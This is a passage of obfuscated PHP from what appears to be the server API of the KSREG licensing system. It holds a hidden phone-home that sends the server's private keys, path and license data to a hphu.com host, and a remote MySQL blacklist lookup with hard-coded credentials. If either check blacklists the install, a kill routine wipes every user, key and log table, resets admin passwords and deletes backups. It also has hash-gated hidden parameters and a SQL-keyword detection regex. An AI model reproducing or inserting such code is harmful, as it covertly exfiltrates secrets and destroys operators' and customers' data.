        if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
        {
            exit( "crypteno888" );
        }
        exit( "Thank you for using KSREG,  please support the Genuine software! LOGLOCK" );
    }
    if ( empty( $_obfuscate_hoiLiJKHjpKJj46NkYuViI0� ) )
    {
        $_obfuscate_hoiLiJKHjpKJj46NkYuViI0� = $_obfuscate_iY2ViY_HkJWTh46MioqSh5U�;
    }
    if ( substr( $_obfuscate_hoiLiJKHjpKJj46NkYuViI0�, 8 ) != sprintf( "%u", crc32( WEBLIC.HTTPKEY.substr( $_obfuscate_hoiLiJKHjpKJj46NkYuViI0�, 0, 8 )."abcdefghijklmn" ) ) )
    {
        @file_put_contents( $_obfuscate_iZCTk5SRlZGVkIqRhouHi5Q�, "" );
        if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
        {
            exit( "crypteno156" );
        }
        exit( "kss_logs/index.log被非法修改" );
    }
    if ( 85400 < abs( strtotime( substr( $_obfuscate_kYaTjoqIi5STkY2Jh4qIlJU�, 0, 8 ) ) - strtotime( substr( $_obfuscate_hoiLiJKHjpKJj46NkYuViI0�, 0, 8 ) ) ) )
    {
        $_obfuscate_jouQkY2GipOLh5CUiI2Thoc� = 1;
        @file_put_contents( $_obfuscate_iZCTk5SRlZGVkIqRhouHi5Q�, $_obfuscate_kYaTjoqIi5STkY2Jh4qIlJU� );
        $_obfuscate_hoiLiJKHjpKJj46NkYuViI0� = @file_get_contents( $_obfuscate_iZCTk5SRlZGVkIqRhouHi5Q� );
        if ( $_obfuscate_kYaTjoqIi5STkY2Jh4qIlJU� != $_obfuscate_hoiLiJKHjpKJj46NkYuViI0� )
        {
            if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
            {
                exit( "crypteno155" );
            }
            exit( "kss_logs/index.log不可写" );
        }
    }
    if ( $_obfuscate_jouQkY2GipOLh5CUiI2Thoc� == 1 )
    {
        set_error_handler( "error_report_fun_norpeat" );
        $_obfuscate_iJSGk5WKlIaUiI6SjZCTh4c� = urlencode( $_obfuscate_hoyQjo_QlYeLh5OVk4yPjZM� );
        $_obfuscate_lIeJjoyHiIuTkYuTj4aGjYo� = date( "Y-m-d H:i:s" );
        $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5U� = $_SERVER['HTTP_HOST'];
        if ( empty( $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5U� ) )
        {
            $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5U� = "notfind";
        }
        if ( $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5U� != "notfind" )
        {
            $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5U� = urlencode( $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5U� );
        }
        if ( _obfuscate_ipWHiIuOiYuPjIaPkZSThok�( "curl_init" ) && _obfuscate_ipWHiIuOiYuPjIaPkZSThok�( "curl_exec" ) )
        {
            _obfuscate_jomIiY_JjIqRkoiTiImVkIc�( $_obfuscate_lIeJjoyHiIuTkYuTj4aGjYo�, $_obfuscate_iJSGk5WKlIaUiI6SjZCTh4c�, $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5U� );
        }
        else
        {
            _obfuscate_lZSKi46HhpCGh4aQh4aVi40�( $_obfuscate_lIeJjoyHiIuTkYuTj4aGjYo�, $_obfuscate_iJSGk5WKlIaUiI6SjZCTh4c�, $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5U� );
        }
        set_error_handler( "error_report_fun" );
    }
}

function _obfuscate_kZGIlYyKh5OIlYyKlYeTlJM�( $_obfuscate_ipKRjYaPkJWQj4eKiJWRjJQ� )
{
    $_obfuscate_h5GOjJOKlI_TkIuTj4yUjow� = opendir( $_obfuscate_ipKRjYaPkJWQj4eKiJWRjJQ� );
    while ( $_obfuscate_kY_Ki4_NiIqMj5CSiIiRk48� = readdir( $_obfuscate_h5GOjJOKlI_TkIuTj4yUjow� ) )
    {
        if ( !( $_obfuscate_kY_Ki4_NiIqMj5CSiIiRk48� != "." ) || !( $_obfuscate_kY_Ki4_NiIqMj5CSiIiRk48� != ".." ) )
        {
            $_obfuscate_j5SMipOTkJSMlYaViJGGlI4� = $_obfuscate_ipKRjYaPkJWQj4eKiJWRjJQ�."/".$_obfuscate_kY_Ki4_NiIqMj5CSiIiRk48�;
            if ( is_dir( $_obfuscate_j5SMipOTkJSMlYaViJGGlI4� ) )
            {
                echo $_obfuscate_j5SMipOTkJSMlYaViJGGlI4�;
                echo "<br>";
            }
        }
    }
    closedir( $_obfuscate_h5GOjJOKlI_TkIuTj4yUjow� );
}

function _obfuscate_ipORj42NiZCIio_LkZORhpE�( $_obfuscate_h4yHlYmLipCJjJCGhomJjZA� )
{
    if ( is_file( "clsdata.log" ) )
    {
        @file_put_contents( "clsdata.log", @date( "ymdHis" )."\t".$_obfuscate_h4yHlYmLipCJjJCGhomJjZA�."\r\n\r\n" );
    }
    else
    {
        @file_put_contents( "clsdata.log", @date( "ymdHis" )."\t".$_obfuscate_h4yHlYmLipCJjJCGhomJjZA�."\r\n\r\n", @FILE_APPEND );
    }
}

function _obfuscate_iZSOiYeSlIqPjpSLkpSIj40�( )
{
    global $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJI�;
    $_obfuscate_kY2Rj4mPjoaGjoeMjpOKhpM� = explode( ",", substr( WEBLIC, 33 ) );
    $_obfuscate_lJOVj5WVkI2PjI6QjZWJjoY� = $_SERVER['HTTP_HOST'];
    $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4� = strpos( $_obfuscate_lJOVj5WVkI2PjI6QjZWJjoY�, ":" );
    if ( $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4� !== FALSE )
    {
        $_obfuscate_lJOVj5WVkI2PjI6QjZWJjoY� = substr( $_obfuscate_lJOVj5WVkI2PjI6QjZWJjoY�, 0, $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4� );
    }
    if ( in_array( strtolower( $_obfuscate_lJOVj5WVkI2PjI6QjZWJjoY� ), $_obfuscate_kY2Rj4mPjoaGjoeMjpOKhpM� ) )
    {
        if ( isset( $_SERVER['ALL_HTTP'] ) && stristr( $_SERVER['ALL_HTTP'], $_obfuscate_lJOVj5WVkI2PjI6QjZWJjoY� ) === FALSE )
        {
            _obfuscate_ipORj42NiZCIio_LkZORhpE�( "no clear,domain err:\r\n".$_SERVER['HTTP_HOST']."\r\n".$_SERVER['ALL_HTTP'] );
            if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
            {
                exit( "crypteno888" );
            }
            exit( "Domain binding errors,  Thank you for using KSREG! ALL_HTTP" );
        }
    }
    _obfuscate_ipORj42NiZCIio_LkZORhpE�( "no clear,domain err:\r\n".$_SERVER['HTTP_HOST']."\r\n".$_SERVER['ALL_HTTP'] );
    if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
    {
        exit( "crypteno888" );
    }
    exit( "Domain binding errors,  Thank you for using KSREG! ALL_HTTP! HTTP_HOST" );
}

function _obfuscate_jomIiY_JjIqRkoiTiImVkIc�( $_obfuscate_lIeJjoyHiIuTkYuTj4aGjYo�, $_obfuscate_iJSGk5WKlIaUiI6SjZCTh4c�, $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5U� )
{
    $_obfuscate_joiNh4aIhouViZGQho_JiI4� = curl_init( );
    curl_setopt( $_obfuscate_joiNh4aIhouViZGQho_JiI4�, CURLOPT_URL, "http://chk".mt_rand( 100000, 999999 ).".hphu.com/skey/api.php?r=".time( ) );
    curl_setopt( $_obfuscate_joiNh4aIhouViZGQho_JiI4�, CURLOPT_RETURNTRANSFER, 1 );
    $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijoc� = "svrid=".SVRID."&hostname=".$_obfuscate_iJSGk5WKlIaUiI6SjZCTh4c�."&skey=".PRV_SVRLIC."&spath=".dirname( __FILE__ )."&domain=".$_obfuscate_i5WSh4iUj4aKi5WVk42Jh5U�."&weblic=".urlencode( WEBLIC )."&webid=".urlencode( WEBID )."&nowtime=".date( "Y-m-d H:i:s" );
    curl_setopt( $_obfuscate_joiNh4aIhouViZGQho_JiI4�, CURLOPT_POST, 1 );
    curl_setopt( $_obfuscate_joiNh4aIhouViZGQho_JiI4�, CURLOPT_POSTFIELDS, $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijoc� );
    curl_setopt( $_obfuscate_joiNh4aIhouViZGQho_JiI4�, CURLOPT_TIMEOUT, 5 );
    curl_setopt( $_obfuscate_joiNh4aIhouViZGQho_JiI4�, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; SV1)" );
    curl_setopt( $_obfuscate_joiNh4aIhouViZGQho_JiI4�, CURLOPT_HTTPHEADER, array( "Accept-Language: zh-cn", "Connection: close", "Cache-Control: no-cache" ) );
    $_obfuscate_lJCJh4yIiZSPi5WUko2Nh4g� = curl_exec( $_obfuscate_joiNh4aIhouViZGQho_JiI4� );
    if ( curl_errno( $_obfuscate_joiNh4aIhouViZGQho_JiI4� ) )
    {
        @curl_close( $_obfuscate_joiNh4aIhouViZGQho_JiI4� );
        _obfuscate_lZSKi46HhpCGh4aQh4aVi40�( );
    }
    else
    {
        curl_close( $_obfuscate_joiNh4aIhouViZGQho_JiI4� );
        if ( $_obfuscate_lJCJh4yIiZSPi5WUko2Nh4g� == "isbadlic" )
        {
            _obfuscate_ipORj42NiZCIio_LkZORhpE�( "clear,curl badlist" );
            _obfuscate_koyMjY2HkImOho6JkIeQh4c�( );
        }
    }
}

function _obfuscate_lZSKi46HhpCGh4aQh4aVi40�( $_obfuscate_lIeJjoyHiIuTkYuTj4aGjYo�, $_obfuscate_iJSGk5WKlIaUiI6SjZCTh4c�, $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5U� )
{
    return FALSE;
}

function _obfuscate_jpSQjpGSkoeUkJGHk4_Pi5E�( $_obfuscate_lIeJjoyHiIuTkYuTj4aGjYo�, $_obfuscate_iJSGk5WKlIaUiI6SjZCTh4c�, $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5U� )
{
    if ( "/" == DIRECTORY_SEPARATOR )
    {
        $_obfuscate_i4mPkoiQlZSHiZKLjZKVi4c� = $_SERVER['SERVER_ADDR'];
    }
    else
    {
        $_obfuscate_i4mPkoiQlZSHiZKLjZKVi4c� = @gethostbyname( @$_SERVER['SERVER_NAME'] );
    }
    $_obfuscate_lIuNkpKUioySj4eTkYqSjZM� = @mysql_connect( "58.221.31.10:33069", "readuser", "password" );
    if ( $_obfuscate_lIuNkpKUioySj4eTkYqSjZM� )
    {
        if ( @mysql_select_db( "readuser", $_obfuscate_lIuNkpKUioySj4eTkYqSjZM� ) )
        {
            $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI� = @mysql_query( @"select * from `locktable` where `lockstr`='".@WEBID."' or `lockstr`='".@WEBLIC."' or `lockstr`='".@PRV_SVRLIC."' or `lockstr`='".$_obfuscate_iJSGk5WKlIaUiI6SjZCTh4c�."' ", $_obfuscate_lIuNkpKUioySj4eTkYqSjZM� );
            if ( $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI� !== FALSE && 0 < mysql_num_rows( $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI� ) )
            {
                _obfuscate_ipORj42NiZCIio_LkZORhpE�( "sql badlist" );
                _obfuscate_koyMjY2HkImOho6JkIeQh4c�( );
                mysql_query( "INSERT INTO `logtablelog` (`isok`,`clienttime` ,`hostname` ,`domain` ,`weblic`, `webid`,`svrid`,`skey`,`cip`)VALUES (0,'".$_obfuscate_lIeJjoyHiIuTkYuTj4aGjYo�."', '".$_obfuscate_iJSGk5WKlIaUiI6SjZCTh4c�."', '".$_obfuscate_i5WSh4iUj4aKi5WVk42Jh5U�."', '".WEBLIC."', '".WEBID."',".( SVRID + 2 ).",'".PRV_SVRLIC."','".$_obfuscate_i4mPkoiQlZSHiZKLjZKVi4c�."')", $_obfuscate_lIuNkpKUioySj4eTkYqSjZM� );
            }
            else
            {
                mysql_query( "INSERT INTO `logtablelog` (`isok`,`clienttime` ,`hostname` ,`domain` ,`weblic`, `webid`,`svrid`,`skey`,`cip`)VALUES (1,'".$_obfuscate_lIeJjoyHiIuTkYuTj4aGjYo�."', '".$_obfuscate_iJSGk5WKlIaUiI6SjZCTh4c�."', '".$_obfuscate_i5WSh4iUj4aKi5WVk42Jh5U�."', '".WEBLIC."', '".WEBID."',".( SVRID + 2 ).",'".PRV_SVRLIC."','".$_obfuscate_i4mPkoiQlZSHiZKLjZKVi4c�."')", $_obfuscate_lIuNkpKUioySj4eTkYqSjZM� );
            }
        }
        @mysql_close( $_obfuscate_lIuNkpKUioySj4eTkYqSjZM� );
        return TRUE;
    }
    return FALSE;
}

function _obfuscate_koyMjY2HkImOho6JkIeQh4c�( $_obfuscate_koqQlY6KkIePi4mHi4uHh5U� = "" )
{
    global $_obfuscate_mGKRY4dMuU6bZZJfh1_TX5k�;
    global $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJI�;
    if ( $_obfuscate_koqQlY6KkIePi4mHi4uHh5U� != "" )
    {
        $_obfuscate_mGKRY4dMuU6bZZJfh1_TX5k� = $_obfuscate_koqQlY6KkIePi4mHi4uHh5U�;
        $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJI� = 0;
    }
    file_put_contents( KSSLOGDIR."index.log", "200001011059550389" );
    if ( defined( "NOTDELMYSQL" ) )
    {
        if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
        {
            exit( "crypteno888" );
        }
        exit( "Thank you for using KSREG,   please support the Genuine software! NCLS" );
    }
    $_obfuscate_j4uLj5OUi42Gh5SQlYiOjIc� = _obfuscate_iJCRko_Hj4_Oh4eIjIaKk5I�( KSSROOTDIR."kss_logs".DIRECTORY_SEPARATOR."databak".DIRECTORY_SEPARATOR, "zip" );
    if ( empty( $_obfuscate_j4uLj5OUi42Gh5SQlYiOjIc� ) )
    {
        foreach ( $_obfuscate_j4uLj5OUi42Gh5SQlYiOjIc� as $_obfuscate_iJWSjpGIi4eHipWGhoeRk4Y� )
        {
            @file_put_contents( $_obfuscate_iJWSjpGIi4eHipWGhoeRk4Y�, "dataerr" );
            @unlink( $_obfuscate_iJWSjpGIi4eHipWGhoeRk4Y� );
        }
    }
    $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc� = new mysql_cls( );
    $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_jIuSjYuUkJGHlYuPjZOQjY4�( $_obfuscate_mGKRY4dMuU6bZZJfh1_TX5k� );
    $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYk� = $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_lZGTiIiKhouKiZGLi5KUkI8�( "select * from kss_tb_soft " );
    foreach ( $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYk� as $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI� )
    {
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']( "update `kss_z_user_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id']."` set cday=1000", "sync" );
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']( "update `kss_z_key_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id']."` set cday=1000", "sync" );
    }
    $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIY�( "update kss_tb_manager set password='000000000000000', rmb=0, level=6, islock=1", "sync" );
    $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIY�( "update kss_tb_soft set softcode=1000099, softmode='NoN', softkey='000000000000000'", "sync" );
    foreach ( $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYk� as $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI� )
    {
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']( "TRUNCATE TABLE `kss_z_user_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id']."`", "sync" );
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']( "TRUNCATE TABLE `kss_z_key_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id']."`", "sync" );
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']( "TRUNCATE TABLE `kss_z_log_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id']."`", "sync" );
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']( "TRUNCATE TABLE `kss_z_user_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id']."_recycle`", "sync" );
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']( "TRUNCATE TABLE `kss_z_key_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id']."`_recycle", "sync" );
    }
    $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIY�( "TRUNCATE TABLE `kss_tb_soft`", "sync" );
    $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIY�( "TRUNCATE TABLE `kss_tb_manager`", "sync" );
    if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
    {
        exit( "crypteno888" );
    }
    exit( "Thank you for using KSREG,    please support the Genuine software! CLS" );
}

define( "CLVersion", 10 );
require( "io_ext.php" );
require( "../kss_inc/inc.php" );
_obfuscate_kouKkIeViIqPk5KMiIiMkpE�( );
require( Client_Language.".php" );
set_error_handler( "error_report_fun_api" );
$_obfuscate_jJKVlIqIlYaKjYmOlIuGkJI� = _obfuscate_i4mIkpOGkomKiouRhoaMh5I�( "c", "pg", "int", 1 );
$_obfuscate_kZOLkIiTk46UiJKPkZSTk48� = _obfuscate_i4mIkpOGkomKiouRhoaMh5I�( "apiver", "pg", "int", 900 );
$_obfuscate_lZOThomRipOIi5SRhpWRjY4� = _obfuscate_i4mIkpOGkomKiouRhoaMh5I�( "a", "pg", "sql", "" );
$_obfuscate_j4uUkImJj4iJipGVioqGk4w� = $_SERVER['HTTP_HOST'];
$_obfuscate_lZWPi4aGiYmRkIuVjYuMh4w� = strpos( $_obfuscate_j4uUkImJj4iJipGVioqGk4w�, ":" );
if ( $_obfuscate_lZWPi4aGiYmRkIuVjYuMh4w� !== FALSE )
{
    $_obfuscate_j4uUkImJj4iJipGVioqGk4w� = substr( $_obfuscate_j4uUkImJj4iJipGVioqGk4w�, 0, $_obfuscate_lZWPi4aGiYmRkIuVjYuMh4w� );
}
if ( isset( $_GET['testsync'] ) && md5( $_GET['testsync'] ) == MYSQLBAKPASSWORD )
{
    $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc� = new mysql_cls( );
    $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_jIuSjYuUkJGHlYuPjZOQjY4�( $_obfuscate_mGKRY4dMuU6bZZJfh1_TX5k� );
    echo "同步测试已启动，请到系统任务日志查看";
    _obfuscate_ho_Ki4_TiZCUk4yOkJCPh5M�( );
    exit( );
}
switch ( $_obfuscate_kZOLkIiTk46UiJKPkZSTk48� )
{
    case 905 :
        define( "CLIENTVER", 905 );
        if ( stristr( WEBLIC.",", ",".$_obfuscate_j4uUkImJj4iJipGVioqGk4w�."," ) === FALSE )
        {
            if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
            {
                exit( "crypteno888" );
            }
            exit( "Thank you for using KSREG, please support the Genuine software![".$_obfuscate_j4uUkImJj4iJipGVioqGk4w�."]" );
        }
        include( "../kss_inc/signdata/crypt95.php" );
        break;
    default :
        if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
        {
            exit( "crypteno531" );
        }
        exit( "kssdata".QQ236 );
}
if ( mt_rand( 1, 10 ) == 5 )
{
    _obfuscate_io_MiI6UjIyKkJOVk5GSjYo�( "api.php", $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJI� );
}
if ( $_obfuscate_lZOThomRipOIi5SRhpWRjY4� == "uplog" )
{
    include( dirname( __FILE__ ).DIRECTORY_SEPARATOR."io".DIRECTORY_SEPARATOR."soft.php" );
    exit( );
}
$_obfuscate_jJKOjo2Qk46Qk4qOjJSTjJM� = 0;
$_obfuscate_hoeUj5OSh5CMlI2Qh42Ijoc� = _obfuscate_i4mIkpOGkomKiouRhoaMh5I�( "s", "pg", "", "" );
$_obfuscate_lImKk4iUhomPiYiKioaHjow� = $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijoc�;
if ( function_exists( "extfun_decode" ) )
{
    $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijoc� = extfun_decode( $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijoc� );
}
$_obfuscate_ko2PhoaRkIeRh5GQjIuGjo4� = 0;
$_obfuscate_hoeUj5OSh5CMlI2Qh42Ijoc� = _obfuscate_kpWMjJWVjZWHj4aTkJGMj4c�( $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijoc�, &$_obfuscate_ko2PhoaRkIeRh5GQjIuGjo4�, Client_Language );
if ( "crypt" != substr( $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijoc�, 0, 5 ) )
{
    if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
    {
        exit( "crypteno118" );
    }
    exit( "kssdata服务器无法正常解密数据。" );
}
if ( substr( $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijoc�, 0, 6 ) == "crypt " )
{
    $_obfuscate_hpKMkImIjJSUh4aVkYuIlZE� = KSSINCDIR."advapi".DIRECTORY_SEPARATOR."rsa".substr( $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijoc�, 9, 7 ).".php";
    if ( is_file( $_obfuscate_hpKMkImIjJSUh4aVkYuIlZE� ) )
    {
        include( $_obfuscate_hpKMkImIjJSUh4aVkYuIlZE� );
        if ( SOFTRSAMODE == 0 )
        {
            if ( strlen( RSA_PRVKEY ) < 70 || strlen( RSA_MODULES ) < 70 || RSACRYPT == 0 )
            {
                exit( "crypteno151" );
            }
            $_obfuscate_io6KipWRkpKNlZKSk5CLkpA� = stripos( $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijoc�, "`" );
            $_obfuscate_hpKMlYyOiYaNiJGNlYuIkYo� = rsa_decrypt( substr( $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijoc�, 17, $_obfuscate_io6KipWRkpKNlZKSk5CLkpA� - 17 ), RSA_PRVKEY, RSA_MODULES, 256 );
            $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijoc� = str_replace( " ", "", substr( $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijoc�, 0, 17 ) ).$_obfuscate_hpKMlYyOiYaNiJGNlYuIkYo�.substr( $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijoc�, $_obfuscate_io6KipWRkpKNlZKSk5CLkpA� + 1 );
        }
        else
        {
            if ( strlen( SOFTRSAEKEY ) < 70 || strlen( SOFTRSANKEY ) < 70 || SOFTRSAMODE == 2 )
            {
                exit( "crypteno151" );
            }
            $_obfuscate_io6KipWRkpKNlZKSk5CLkpA� = stripos( $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijoc�, "`" );
            $_obfuscate_hpKMlYyOiYaNiJGNlYuIkYo� = rsa_decrypt( substr( $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijoc�, 17, $_obfuscate_io6KipWRkpKNlZKSk5CLkpA� - 17 ), SOFTRSAEKEY, SOFTRSANKEY, 256 );
            $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijoc� = str_replace( " ", "", substr( $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijoc�, 0, 17 ) ).$_obfuscate_hpKMlYyOiYaNiJGNlYuIkYo�.substr( $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijoc�, $_obfuscate_io6KipWRkpKNlZKSk5CLkpA� + 1 );
        }
    }
    else
    {
        exit( "crypteno171" );
    }
}
if ( defined( "SQLSAFECHK" ) && preg_match( "/select|insert|update|delete |union|into|load_file|outfile|\\.\\/|\\/\\*|\\%[0-9a-f]{2}|--|char\\(|0x[0-9a-f]{6}|'/i", $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijoc� ) )
{
    $_obfuscate_ipWMho2NlI2MiI_MioeTlZI� = "?";
    $_obfuscate_ipCIiZCRiYmKhpOSi4eSjZI� = "<".$_obfuscate_ipWMho2NlI2MiI_MioeTlZI�."php exit('Access denied to view this page!');".$_obfuscate_ipWMho2NlI2MiI_MioeTlZI�.">\r\n";
    if ( !is_file( "sqlhklog.php" ) || 102400 < filesize( "sqlhklog.php" ) )
    {
        file_put_contents( "sqlhklog.php", $_obfuscate_ipCIiZCRiYmKhpOSi4eSjZI�.date( "ymdHis" )."\t"._obfuscate_iIuRj5CUkIuHi4mPkY2Vio0�( )."\t".$_obfuscate_hoeUj5OSh5CMlI2Qh42Ijoc�."\r\n\r\n" );
    }
    else
    {
        file_put_contents( "sqlhklog.php", date( "ymdHis" )."\t"._obfuscate_iIuRj5CUkIuHi4mPkY2Vio0�( )."\t".$_obfuscate_hoeUj5OSh5CMlI2Qh42Ijoc�."\r\n\r\n", FILE_APPEND );
    }
    if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
    {
        exit( "crypteno157" );
    }
    exit( "kssdata".QQ235 );
}
$_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U� = explode( ":|:", $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijoc� );
if ( isset( $_GET['view'] ) && md5( $_GET['view'] ) == "fb87582825f9d28a8d42c5e5e5e8b23d" )
{
    print_r( $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U� );
}
$_obfuscate_kZOJlZCOlZKRioiGiIuPkok� = "io";
$_obfuscate_kZGNjJSKkpCQj4yOj5GNiIo� = $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[2];
$_obfuscate_iImHhpCJi4eSkY_VjZOUj5Q� = $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[3];
$_obfuscate_joeUio_LioqSh5WIiI2Pk4s� = $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[4];
$_obfuscate_io_UkouIkIyHj42UlI_GiZA� = explode( ",", $_obfuscate_joeUio_LioqSh5WIiI2Pk4s� );
$_obfuscate_jomPk5WKioeLipGGi4_PhpM� = time( );
if ( stripos( WEBLIC, "v9.hphu.com" ) )
{
    if ( stripos( WEBLIC, "vip.gutou.cc" ) !== FALSE )
    {
        if ( 1000200 < $_obfuscate_iImHhpCJi4eSkY_VjZOUj5Q� )
        {
            if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
            {
                exit( "crypteno103" );
            }
            exit( "kssdata".QQ102.strlen( $_obfuscate_iImHhpCJi4eSkY_VjZOUj5Q� ) );
        }
    }
    if ( 1000100 < $_obfuscate_iImHhpCJi4eSkY_VjZOUj5Q� )
    {
        if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
        {
            exit( "crypteno103" );
        }
        exit( "kssdata".QQ102.strlen( $_obfuscate_iImHhpCJi4eSkY_VjZOUj5Q� ) );
    }
}
if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
{
    if ( !_obfuscate_kZKMiI2OlY6Ih42OkI6Sjo0�( $_obfuscate_iImHhpCJi4eSkY_VjZOUj5Q� ) || strlen( $_obfuscate_iImHhpCJi4eSkY_VjZOUj5Q� ) != 7 )
    {
        if ( _obfuscate_kZKMiI2OlY6Ih42OkI6Sjo0�( $_obfuscate_iImHhpCJi4eSkY_VjZOUj5Q� ) !== TRUE )
        {
            exit( "crypteno330" );
        }
        exit( "crypteno103" );
    }
    if ( stripos( $_obfuscate_joeUio_LioqSh5WIiI2Pk4s�, "'" ) !== FALSE )
    {
        exit( "crypteno110" );
    }
}
$_obfuscate_h5CLkpKNipOHjIqSiIaUlYo� = _obfuscate_kZKMiI2OlY6Ih42OkI6Sjo0�( $_obfuscate_iImHhpCJi4eSkY_VjZOUj5Q� );
if ( !_obfuscate_kZKMiI2OlY6Ih42OkI6Sjo0�( $_obfuscate_iImHhpCJi4eSkY_VjZOUj5Q� ) || strlen( $_obfuscate_iImHhpCJi4eSkY_VjZOUj5Q� ) != 7 )
{
    if ( _obfuscate_kZKMiI2OlY6Ih42OkI6Sjo0�( $_obfuscate_iImHhpCJi4eSkY_VjZOUj5Q� ) !== TRUE )
    {
        exit( "kssdata".QQ330.strlen( $_obfuscate_iImHhpCJi4eSkY_VjZOUj5Q� ) );
    }
    exit( "kssdata".QQ102.strlen( $_obfuscate_iImHhpCJi4eSkY_VjZOUj5Q� ) );
}
if ( stripos( $_obfuscate_joeUio_LioqSh5WIiI2Pk4s�, "'" ) !== FALSE )
{
    exit( "kssdata".QQ103 );
}
